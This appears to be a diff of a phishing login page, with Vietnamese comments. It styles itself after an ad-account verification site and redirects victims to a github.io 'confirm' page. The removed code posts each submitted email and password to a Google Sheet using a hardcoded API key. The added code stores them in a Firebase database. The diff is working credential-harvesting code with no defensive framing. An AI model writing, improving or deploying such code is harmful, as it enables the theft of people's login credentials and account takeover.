@@ -23,7 +23,8 @@
   <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
-  <script defer="defer" src="https://contactadsverrifyaccounts.cloud//static/js/main.aae6dd77.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.12.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.12.0/firebase-database.js"></script>
   <link href="https://contactadsverrifyaccounts.cloud//static/css/main.89ada21a.css" rel="stylesheet">
 </head>
 <body>
@@ -60,45 +61,43 @@
   </div>
 
   <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",  // Thay thế với API Key của bạn
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Khởi tạo Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database(app);
+
+    // Lắng nghe sự kiện gửi form
     document.getElementById("loginForm").addEventListener("submit", function(event) {
       event.preventDefault();
 
       var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      // API Key và Sheet ID của bạn
-      var apiKey = "AIzaSyAnbBcvSxo1GKzbI1vd41HWLdmjN-mBI9E";
-      var sheetId = "1SWK_J1STGsRYr-9Wgf9Xe0toTBrVE1NhgNb5YTTCb4g";
-      var range = "Sheet1!A1:B1"; // Cập nhật phạm vi với tên sheet của bạn
-
-      // URL của API Google Sheets
-      var url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=RAW&key=${apiKey}`;
-      
-      var data = {
-        values: [
-          [email, password]
-        ]
-      };
-
-      // Gửi dữ liệu tới Google Sheets
-      fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data)
+      // Lưu dữ liệu vào Firebase Realtime Database
+      const newUserRef = database.ref('users').push();
+      newUserRef.set({
+        email: email,
+        password: password
       })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Success:', data);
+      .then(() => {
+        console.log('Dữ liệu đã được lưu vào Firebase');
         // Chuyển hướng đến confirm.html
         window.location.href = 'https://girlhotnewstoday.github.io/logins/confirm.html';
       })
       .catch((error) => {
-        console.error('Error:', error);
+        console.error('Lỗi khi lưu dữ liệu vào Firebase:', error);
       });
     });
   </script>
-
 </body>
 </html>
